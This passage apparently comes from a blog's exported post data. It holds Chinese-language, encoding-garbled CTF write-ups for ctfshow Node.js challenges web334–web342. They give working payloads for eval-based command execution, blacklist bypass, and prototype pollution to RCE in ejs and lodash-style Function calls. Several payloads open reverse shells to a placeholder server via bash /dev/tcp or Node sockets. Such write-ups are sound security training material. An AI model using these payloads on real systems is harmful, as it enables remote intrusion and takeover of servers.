&#x27;babbb&#x27;, &#x27;y&#x27;: &#x27;bbaaa&#x27;, &#x27;z&#x27;: &#x27;bbaab&#x27;&#125;def bacon(cipher): msg = &#x27;&#x27; codes = re.findall(r&#x27;.&#123;5&#125;&#x27;, cipher) for code in codes: if code == &#x27;&#x27;: msg += &#x27; &#x27; else: UNCODE = dict(map(lambda t: (t[1], t[0]), table.items())) msg += UNCODE[code] return msgif __name__ == &#x27;__main__&#x27;: cipher = &#x27;BABBBBBAAAABAAB&#x27; cipher = cipher.lower() plaintext = bacon(cipher) print(plaintext) è§£å‡ºæ¥å¾—çŸ¥ word æ–‡æ¡£å¯†ç  xyj é¢œè‰²éšè—è·å– flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0}","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"æ¯”èµ›","slug":"ctf/æ¯”èµ›","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"ctfshow nodejsç¯‡","slug":"ctfshow-nodejs","date":"2021-05-04T13:50:42.000Z","updated":"2021-05-06T08:04:49.599Z","comments":true,"path":"2021/05/04/ctfshow-nodejs/","link":"","permalink":"https://tari.moe/2021/05/04/ctfshow-nodejs/","excerpt":"","text":"web342 å¾ˆåˆºæ¿€ ï¼ˆ æ„Ÿè§‰å¯¹åŸå‹é“¾æ±¡æŸ“ç†è§£åˆåŠ æ·±äº†å‘¢~ web334 JS å¤§å°å†™ç‰¹æ€§æœé›†äº†åŠå¤©ä¿¡æ¯ï¼Œå‘ç°é¢˜ç›®æè¿°å¤„æœ‰æºç å¯ä»¥ç›´æ¥ä¸‹è½½ã€‚ã€‚ user.js 12345module.exports = &#123; items: [ &#123;username: &#x27;CTFSHOW&#x27;, password: &#x27;123456&#x27;&#125; ]&#125;; login.js 123456789101112131415161718192021222324252627282930313233var express = require(&#x27;express&#x27;);var router = express.Router();var users = require(&#x27;../modules/user&#x27;).items; var findUser = function(name, password)&#123; return users.find(function(item)&#123; return name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; &#125;);&#125;;/* GET home page. */router.post(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var flag=&#x27;flag_here&#x27;; var sess = req.session; var user = findUser(req.body.username, req.body.password); if(user)&#123; req.session.regenerate(function(err) &#123; if(err)&#123; return res.json(&#123;ret_code: 2, ret_msg: &#x27;ç™»å½•å¤±è´¥&#x27;&#125;); &#125; req.session.loginUser = user.username; res.json(&#123;ret_code: 0, ret_msg: &#x27;ç™»å½•æˆåŠŸ&#x27;,ret_flag:flag&#125;); &#125;); &#125;else&#123; res.json(&#123;ret_code: 1, ret_msg: &#x27;è´¦å·æˆ–å¯†ç é”™è¯¯&#x27;&#125;); &#125; &#125;);module.exports = router; å³æ»¡è¶³ 1name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; æˆ‘ä»¬è¾“å…¥çš„ name ä¸ä¸º CTFSHOW ç„¶å name è½¬æ¢åçš„å¤§å†™ä¸º CTFSHOW ï¼Œå¯†ç ä¸º 123456 å³å¯ã€‚ ç½‘ä¸Šçœ‹äº†ä¸€ä¸‹ï¼Œå…¶å®æƒ³è¦çš„è€ƒç‚¹æ˜¯ toUpperCase() å‡½æ•°ï¼Œå­—ç¬¦ Ä± ä¼šè½¬å˜ä¸º I ï¼Œå­—ç¬¦ Å¿ ä¼šå˜ä¸º S ã€‚ toLowerCase() å‡½æ•°ä¸­ï¼Œå­—ç¬¦ Ä° ä¼šè½¬å˜ä¸º i ï¼Œå­—ç¬¦ â„ª ä¼šè½¬å˜ä¸º k ã€‚ å¯ä»¥å‚è€ƒ https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html è¿™æ ·çš„åº”è¯¥æ˜¯ï¼Œæ¯”å¦‚å­—ç¬¦ s æˆ– S ä¸èƒ½å‡ºç°åœ¨è¾“å…¥å­—ç¬¦ä¸­å°±å¥½äº†ã€‚ web335 RCEf12 æºç æç¤º 1&lt;!-- /?eval= --&gt; å³ç®€å•å‘½ä»¤æ‰§è¡Œ 1/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString() è·å– flag 1&#x2F;?eval&#x3D;require(%27child_process%27).spawnSync(%27cat%27,[%27fl00g.txt%27]).stdout.toString() web336 RCE é»‘åå•ç»•è¿‡f12 æºç æç¤º 1&lt;!-- /?eval= --&gt; å³ç®€å•å‘½ä»¤æ‰§è¡Œ 1/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString() è·å– flag 1/?eval=require(%27child_process%27).spawnSync(%27cat%27,[%27fl001g.txt%27]).stdout.toString() emm å¥½åƒå°± flag æ–‡ä»¶æ¢äº†ä¸ªåå­—ï¼Ÿ é¡ºä¾¿æ”¶é›†å¤šå‡ ä¸ªå‘½ä»¤æ‰§è¡Œ 123require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString()require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).toString() æ”¶é›†è¿‡ç¨‹ä¸­å‘ç°ï¼ŒåŸæ¥ç¬¬ 2ã€3 ä¸ª è¢«ç¦äº†ï¼Œ2333 åŸæ¥è€ƒå¯Ÿé»‘åå• å…ˆé€šè¿‡å…¨å±€å˜é‡è¯»å–å½“å‰ç›®å½•ä½ç½® 1/?eval=__filename å½“å‰ç›®å½• 1/?eval=__dirname è¯»æ–‡ä»¶ 1/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;,&#x27;utf-8&#x27;) å‘ç°è¿‡æ»¤äº†execå’Œload ç»•è¿‡æ–¹æ³• 1?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;ls&#x27;).toString() å› ä¸º require(&#39;child_process&#39;) æ–¹æ³•è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡ç±»å‹ Pythonæ•°ç»„çš„æ–¹å¼å»è®¿é—®é‡Œé¢çš„æˆå‘˜ã€‚ æˆ–è€…ç”¨å…¶ä»–æ¨¡å—è¯»æ–‡ä»¶ 12/?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;,&#x27;utf-8&#x27;) å½“ç„¶è¿˜æœ‰å…¶ä»–å§¿åŠ¿ï¼Œæ¯”å¦‚å˜é‡æ‹¼æ¥åœ¨æ‰§è¡Œ 1var%20s=%27global.process.mainModule.constructor._lo%27;var%20b=&quot;ad(%27child_process%27).ex&quot;;var%20c=&quot;ec(%27cat+fl001g.txt&gt;public/1.txt%27);&quot;;eval(s%2Bb%2Bc); web337 md5ç»•è¿‡12345678910111213141516171819202122232425var express = require(&#x27;express&#x27;);var router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123; return crypto.createHash(&#x27;md5&#x27;) .update(s) .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var flag=&#x27;xxxxxxx&#x27;; var a = req.query.a; var b = req.query.b; if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123; res.end(flag); &#125;else&#123; res.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;); &#125; &#125;);module.exports = router; å’Œ PHP ä¸€æ ·ï¼Œæ•°ç»„ç»•è¿‡å³å¯ 1/?a[]=1&amp;b=1 å‘ç°è¿™æ ·æ›´æ˜“äºç†è§£ payload: a[x]=1&amp;b[x]=2 è¿è¡Œä¸€ä¸‹ä»£ç  1234567891011a=&#123;&#x27;x&#x27;:&#x27;1&#x27;&#125;b=&#123;&#x27;x&#x27;:&#x27;2&#x27;&#125;console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)a=[1]b=[2]console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;) web338 åŸå‹é“¾æ±¡æŸ“é¢˜ç›®æè¿°å¤„è“å¥äº‘ä¸‹è½½æºç  ğŸ“web338.zip å…ˆçœ‹çœ‹è¿™ç¯‡æ–‡ç« äº†è§£ä¸€æ³¢ä»€ä¹ˆæ˜¯ JS çš„åŸå‹é“¾æ±¡æŸ“ https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html å…³é”®ä»£ç  utils/common.js 123456789function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125; &#125; routes/login.js 123456var secert = &#123;&#125;;....utils.copy(user,req.body); if(secert.ctfshow===&#x27;36dboy&#x27;)&#123; res.end(flag); &#125; ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸ç”¨å…³å¿ƒ secert æ˜¯å¦æœ‰ ctfshow è¿™ä¸ªå±æ€§ï¼Œå› ä¸ºå½“å®ƒæ‰¾ä¸åˆ°è¿™ä¸ªå±æ€§æ—¶ï¼Œå®ƒä¼šä»å®ƒè‡ªå·±çš„åŸå‹é‡Œæ‰¾ã€‚ è¿™é‡Œçš„ secert æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç„¶å utils.copy(user,req.body); æ“ä½œæ˜¯ user ä¹Ÿæ˜¯æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€šè¿‡ req.body å³ POST è¯·æ±‚ä½“ä¼ å…¥å‚æ•°ï¼Œé€šè¿‡ user æ±¡æŸ“æ•°ç»„çš„åŸå‹ï¼Œé‚£ä¹ˆ secert æ•°ç»„æ‰¾ä¸åˆ° ctfshow å±æ€§æ—¶ï¼Œä¼šä¸€ç›´å¾€åŸå‹æ‰¾ï¼Œç›´åˆ°åœ¨æ•°ç»„åŸå‹ä¸­å‘ç° ctfshow å±æ€§å€¼ä¸º 36dboy ã€‚é‚£ä¹ˆ if è¯­å¥å³åˆ¤æ–­æˆåŠŸï¼Œå°±ä¼šè¾“å‡º flag äº†ã€‚ payload 1&#123;&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125; ä¸€èˆ¬é‡åˆ°è¿™ç§æ•´å¥—ä»£ç ï¼Œç‰¹åˆ«æ˜¯å¸¦æœ‰ package.json çš„ï¼Œå¯ä»¥å°è¯• snyk ï¼Œ å‘ç°ä¸ª ejs çš„ RCE https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/ 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/æœåŠ¡å™¨IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;&#125; å…ˆæ±¡æŸ“å‚æ•° ç„¶åéšä¾¿è¯·æ±‚ä¸€ä¸‹ï¼Œè§¦å‘ render æ–¹æ³• æˆåŠŸåå¼¹ shell ä¸è¿‡ snyk ç»™å‡ºçš„ poc ç”¨ filename å‚æ•°åˆ©ç”¨å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œ ä¸å¤ªæ¸…æ¥šä¸ºå•¥ã€‚ã€‚å³ 1&#123;&quot;__proto__&quot;:&#123;&quot;filename&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/æœåŠ¡å™¨IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;&#125; é¡ºä¾¿è®°å½•ä¸€ä¸‹ node é¡¹ç›®æœ¬åœ°å¯åŠ¨æ–¹æ³•ï¼Œåœ¨é¡¹ç›®æ–‡ä»¶è¿è¡Œä¸‹é¢å‘½ä»¤å³å¯ã€‚ 1npm start é»˜è®¤ç«¯å£ä¸º 3000 web339 åŸå‹é“¾æ±¡æŸ“ +node/v10.19.0 é¢˜ç›®æè¿°å¤„è“å¥äº‘ä¸‹è½½æºç  ğŸ“web339.zip å’Œ web338 æœ‰ç‚¹ç›¸ä¼¼ï¼Œä¸è¿‡ä¸åŒç‚¹æ˜¯ 123456var flag=&#x27;flag_here&#x27;;....utils.copy(user,req.body);if(secert.ctfshow===flag)&#123; res.end(flag); &#125; flag æ˜¯å˜é‡ï¼Œå…·ä½“å€¼ä¸çŸ¥ ç„¶åè¿˜å¤šäº†ä¸ª api.js ï¼Œä¸»è¦å…³æ³¨è¿™è¡Œ 1res.render(&#x27;api&#x27;, &#123; query: Function(query)(query)&#125;); æ˜¯ä¸æ˜¯å’Œ web338 é‡Œçš„å‚è€ƒé“¾æ¥ PHITHON å¸ˆå‚…å‡ºçš„ Code-Breaking 2018 Thejs å¦‚å‡ºä¸€è¾™ï¼Ÿå³å¯ä»¥ RCEï¼Œå› ä¸ºè¿™é‡Œå¯æ±¡æŸ“ç‚¹å­˜åœ¨çš„åŒ¿åå‡½æ•°è°ƒç”¨ https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165 https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L225 ä»¿ç…§é¢˜ç›®ä¸­çš„ä»£ç ï¼Œå…ˆå†™ä¸ªå°demo 1234567891011121314function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125; &#125;user = &#123;&#125;body = JSON.parse(&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return 2233&quot;&#125;&#125;&#x27;);copy(user, body)&#123; query: Function(query)(query)&#125; ä¸ºä»€ä¹ˆ query çš„å€¼æ˜¯ 2233 å‘¢ï¼Ÿä¹Ÿå°±æ˜¯ä¸ºå•¥ä¼šè¢«è°ƒç”¨äº†å‘¢ï¼Ÿ é¦–å…ˆçœ‹çœ‹ query å€¼æ˜¯å¦‚ä½•è¢«æ”¹å˜çš„ï¼Œå…¶å®å°±æ˜¯é€šè¿‡ web338 çš„åŸå‹é“¾æ±¡æŸ“ï¼Œå³ JS ä¸­æ‰€æœ‰çš„å¯¹è±¡çš„åŸå‹éƒ½å¯ä»¥ç»§æ‰¿åˆ° Objectï¼Œç„¶åç»ˆç‚¹æ˜¯ null å¯¹è±¡ å¦‚ web338 ä¸­æ‰€è¯´çš„ï¼Œå½“åœ¨å½“å‰ä¸Šä¸‹æ–‡æ‰¾ä¸åˆ°ç›¸åº”å¯¹è±¡æ—¶ï¼Œä¼šéå† Object å¯¹è±¡æ˜¯å¦å­˜åœ¨ç›¸åº”çš„å±æ€§ã€‚ åˆ°è¿™é‡Œå°±å¾ˆæ¸…æ¥šçš„çŸ¥é“äº†ï¼Œä¸ºä»€ä¹ˆ query çš„å€¼æ˜¯ &quot;return 2233&quot; ï¼Œå› ä¸ºåœ¨è°ƒç”¨ copy æ—¶ï¼ŒåŸå‹é“¾è¢«æ±¡æŸ“äº†ã€‚ è‡³äº &#123; query: Function(query)(query)&#125; ä¸ºä½•ä¸º &#123; query: 2233 &#125; JS çš„å‡½æ•°å®é™…ä¸Šéƒ½æ˜¯ä¸€ä¸ª Function å¯¹è±¡ï¼Œå®ƒçš„å‚æ•°ä¸º 1new Function ([arg1[, arg2[, ...argN]],] functionBody) å†™ä¸ªå°demo å³ Function å¯¹è±¡ä¼ å…¥æ„é€ å‡½æ•°é‡Œçš„å‰é¢å‚æ•°æ˜¯å‡½æ•°çš„å½¢å‚ï¼Œå½“ç„¶å¯ä»¥çœç•¥ï¼Œæœ€åçš„å½¢å‚å†™å‡½æ•°ä½“ã€‚ å…¶å®ä½œç”¨å’Œ eval æœ‰ç‚¹ç±»ä¼¼ï¼Œè¯¦ç»†å¯ä»¥çœ‹ https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function è‡³æ­¤ï¼Œåˆ©ç”¨æ€è·¯æ˜ç¡®äº†ï¼Œåªè¦æ±¡æŸ“äº† query å¯¹è±¡ï¼Œå°±å¯ä»¥æ‰§è¡Œä»»æ„æˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç ï¼Œæ¯”å¦‚åå¼¹ä¸ª shell å†è·å– flag ~ ç„¶åæ±¡æŸ“ç‚¹å’Œ web338 ä¸€è‡´ï¼Œåœ¨ login.js é‡Œçš„ utils.copy(user,req.body); ï¼Œä»£ç æ‰§è¡Œçš„è§¦å‘ç‚¹åœ¨ api.js çš„ res.render(&#39;api&#39;, &#123; query: Function(query)(query)&#125;); å¤„ã€‚ payload ï¼Œè¿™é‡Œç”¨ nodejs åŸç”Ÿ socketï¼Œé˜²æ­¢å› ç³»ç»Ÿè¿è¡Œç¯å¢ƒé—®é¢˜ shell å¼¹ä¸å›æ¥ï¼Œè¿™é‡ŒæœåŠ¡å™¨çš„ç›‘å¬ç«¯å£ä¸º 2233 ï¼Œç„¶åå¦‚ä½•æ˜¯ windows ç³»ç»Ÿå°±æŠŠ /bin/sh æ¢æˆ cmd.exe åº”è¯¥å°±å¯ä»¥äº†ã€‚ 1&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;æœåŠ¡å™¨IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125; å…ˆæœ¬åœ°è¯•è¯•ï¼Œè¿™é‡ŒæœåŠ¡å™¨ç›‘å¬ç«¯å£ä¸º 2233 1234567891011121314function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125; &#125;user = &#123;&#125;body = JSON.parse(&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = require(\\&#x27;net\\&#x27;),cp = require(\\&#x27;child_process\\&#x27;),sh = cp.spawn(\\&#x27;/bin/sh\\&#x27;, []);var client = new net.Socket();client.connect(2233, \\&#x27;æœåŠ¡å™¨IP\\&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#x27;);copy(user, body)&#123; query: Function(query)(query)&#125; okï¼Œæ²¡å•¥å¤§é—®é¢˜ã€‚ å…ˆ POST ä¸€ä¸‹ login æ¥å£ï¼Œæ±¡æŸ“ query å¯¹è±¡ ç„¶åç›´æ¥ POST ä¸€ä¸‹ api æ¥å£å³å¯ã€‚ emmï¼Œå‘ç°ä¸è¡Œï¼Œä¹‹åè®¿é—® /login å’Œ /api æ¥å£éƒ½æ˜¯ 404 æ‰¾ä¸åˆ°æ–‡ä»¶ ï¼Œshell ä¹Ÿåå¼¹ä¸å›æ¥ã€‚ è¯•è¯•åˆ«äººçš„ 1&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/æœåŠ¡å™¨IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125; flag ä»”ç»†å¯¹æ¯”äº†ä¸€ä¸‹ï¼Œå‘ç°äº†ï¼Œæ„Ÿè§‰æ˜¯å‘½åç©ºé—´é—®é¢˜ï¼Œå³ require å¯èƒ½ä¸è¢«è¯†åˆ«ï¼Œå°è¯•æŠŠ require æ”¹ä¸º global.process.mainModule.constructor._load ï¼ŒåŒæ ·æœåŠ¡å™¨ç›‘å¬ç«¯å£ä¸º 2233 1&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;æœåŠ¡å™¨IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125; ä¹Ÿæ˜¯å…ˆ POST /login æ¥å£æ±¡æŸ“ query å¯¹è±¡ è®¿é—®ä¸‹ /api æ¥å£ åå¼¹ shell å¹¶è·å– flag ç„¶åé¡ºä¾¿ç¿»äº†ä¸ªé“¾æ¥ï¼Œå¥½åƒç¡®å®å¦‚æ­¤~ https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js å› ä¸º node æ˜¯åŸºäº chrome v8 å†…æ ¸çš„ï¼Œè¿è¡Œæ—¶ï¼Œå‹æ ¹å°±ä¸ä¼šæœ‰ require è¿™ç§å…³é”®å­—ï¼Œæ¨¡å—åŠ è½½ä¸è¿›æ¥ï¼Œè‡ªç„¶ shell å°±åå¼¹ä¸äº†äº†ã€‚ä½†åœ¨ nodeäº¤äº’ç¯å¢ƒï¼Œæˆ–è€…å†™ js æ–‡ä»¶æ—¶ï¼Œé€šè¿‡ node è¿è¡Œä¼šè‡ªåŠ¨æŠŠ require è¿›è¡Œç¼–è¯‘ã€‚ è¿˜æœ‰ä¸€ä¸ªå…¶ä»–è§£ï¼Œè§ web338 ä¸­çš„ ejs RCEï¼Œä¸€æ ·çš„EXPã€æ­¥éª¤å’Œåˆ©ç”¨æ–¹å¼ web340 åŸå‹è¿æ±¡æŸ“ ++nodejs/v10.19.0 é¢˜ç›®æè¿°å¤„è“å¥äº‘ä¸‹è½½æºç  ğŸ“web340.zip æå–å…³é”®éƒ¨åˆ† 123456789101112var flag=&#x27;flag_here&#x27;;var user = new function()&#123; this.userinfo = new function()&#123; this.isVIP = false; this.isAdmin = false; this.isAuthor = false; &#125;;&#125;utils.copy(user.userinfo,req.body);if(user.userinfo.isAdmin)&#123; res.end(flag);&#125; å‘ç° userinfo çš„åŸå‹ä¸æ˜¯ Object å¯¹è±¡ï¼Œ userinfo.__proto__.__proto__ æ‰æ˜¯ Object å¯¹è±¡ã€‚ å’Œ web339 ä¸€æ ·ï¼Œåªä¸è¿‡è¦å¥—ä¸¤å±‚æ‰èƒ½æ±¡æŸ“ Object å¯¹è±¡ï¼ŒåŒæ ·ç”¨åŸç”Ÿ socketï¼ŒæœåŠ¡ç«¯ç›‘å¬ç«¯å£ä¸º 2233 ï¼ˆ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;æœåŠ¡å™¨IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#125; åŒæ · POST ä¸€ä¸‹ /login æ¥å£æ±¡æŸ“ query å¯¹è±¡ POST ä¸€ä¸‹ /api æ¥å£è§¦å‘ è·å– flag web341 åŸå‹é“¾æ±¡æŸ“ +++é¢˜ç›®æè¿°å¤„è“å¥äº‘ä¸‹è½½æºç  ğŸ“web341.zip è¿™é¢˜å’Œå…¶ä»–ä¸åŒçš„æ˜¯æ²¡æœ‰ /api æ¥å£è§¦å‘æ±¡æŸ“ç‚¹äº†ï¼Œæ‰€ä»¥ä½¿ç”¨ web338 ä¸­çš„ ejs RCEã€‚ ç„¶ååƒ web340 ä¸€æ ·æ±¡æŸ“è¦å¥—ä¸¤å±‚ã€‚ä¸‹é¢ EXP ä¹ŸæœåŠ¡å™¨ç›‘å¬ç«¯å£æ˜¯ 2233 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;æœåŠ¡å™¨IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();var __tmp2&quot;&#125;&#125;&#125; æ³¨æ„è¿™é‡Œçš„å‰é¢çš„ _tmp1; å’Œåé¢çš„ var __tmp2 ä¸èƒ½åˆ ï¼Œweb338 evil0 çš„åˆ†ææœ‰ä½“ç°åˆ°ï¼Œæ˜¯ä¸ºäº†é—­åˆä»£ç ã€‚ åŒæ · POST ä¸€ä¸‹ /login æ¥å£æ±¡æŸ“æ•°æ® ç„¶åè¯·æ±‚ä¸€ä¸ªä¼šè°ƒç”¨ render æ–¹æ³•çš„æ¥å£ å³å¯è·å¾— flag web342 åŸå‹é“¾æ±¡æŸ“ ++++é¢˜ç›®æè¿°å¤„è“å¥äº‘ä¸‹è½½æºç  ğŸ“web342.zip ç„¶åè¿˜æœ‰ä¸ªæç¤º å®¡è®¡äº†1ä¸ªå°æ—¶å‘ç°çš„ï¼Œæ­¤é“¾ç›®å‰ç½‘ä¸Šæœªå…¬å¼€ï¼Œéš¾åº¦ç¨å¤§ æœ¬é¢˜å°±ä¸æ˜¯ç”¨ ejs è¿›è¡Œæ¨¡æ¿æ¸²æŸ“äº†ï¼Œè€Œæ˜¯ä½¿ç”¨äº† jade ä¸€å¼€å§‹æƒ³çœ‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç«  https://xz.aliyun.com/t/7025 emmï¼Œä½†æ˜¯å‘ç°è¯´çš„æ¯ä¸ªå­—éƒ½è®¤è¯†ï¼Œè¿èµ·æ¥å°±è§‰å¾—æœ‰ç‚¹è«åå…¶å¦™äº†ã€‚ã€‚äºæ˜¯æƒ³ç€å…ˆè‡ªå·±æ‰‹åŠ¨åˆ†æä¸€ä¸‹ï¼Œç†Ÿæ‚‰ä¸€æ³¢ï¼Œæ–¹ä¾¿è‡ªå·±å’Œå¸ˆå‚…åœ¨åŒä¸€ä¸ªé¢‘é“ä¸Šï¼Œé˜²æ­¢å¸ˆå‚…è¯´çš„æ¯å¥è¯éƒ½æ„Ÿè§‰è«åå…¶å¦™â€¦ è¯¦ç»†çš„æ–­ç‚¹åˆ†æå‚è€ƒ https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade è¿™é‡Œç”¨ VS Code æ¥ debug åˆ†æ å°±ä¼šè‡ªåŠ¨åˆ›å»ºè¿™æ ·ä¸€ä¸ªæ–‡ä»¶ 1234567891011121314151617&#123; // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;type&quot;: &quot;pwa-node&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;name&quot;: &quot;Launch Program&quot;, &quot;skipFiles&quot;: [ &quot;&lt;node_internals&gt;/**&quot; ], &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;/bin/www&quot; &#125; ]&#125; ç„¶åä¸‹ä¸ªæ–­ç‚¹ï¼Œè¿è¡Œä¸€ä¸‹ï¼Œè®¿é—®ç½‘é¡µå°±å¯ä»¥å¼€å§‹æ„‰å¿«çš„ debug äº† è¿™é‡Œç›´æ¥ç”¨ ctfshow web342 çš„ä»£ç è¿›è¡Œ ä¾æ¬¡è¿›å…¥ res.render=&gt;app.render=&gt;tryRender=&gt;view.render=&gt;this.engine å…¥å£æ˜¯ rederFile æ–¹æ³•ï¼Œæ³¨æ„ renderFile å‡½æ•°è¿”å›å€¼å¯æ‰§è¡Œ è¿›å…¥ handleTemplateCache è¿›å…¥ compile å‡½æ•° 205è¡Œ æœ‰ä¸ª parse è§£æï¼Œå¯ä»¥çœ‹åˆ°ç»“æœè¿”å›åˆ° parsedï¼Œåˆä¼ é€’ç»™äº† fnï¼Œå…ˆä¸ç®¡ parse æ–¹æ³•ï¼Œç»§ç»­å‘ä¸‹çœ‹ä»£ç  218è¡Œ è¿™é‡Œå°±æ¯”è¾ƒæœ‰è¶£äº†ï¼Œæœ‰ä¸ªçœ‹ä¼¼å¯æ§çš„ä»£ç æ‰§è¡Œï¼ˆnew Functionï¼Œè¿™ä¸ªåœ¨ web339 æœ‰æåˆ°ï¼‰ è¿›å…¥ parse 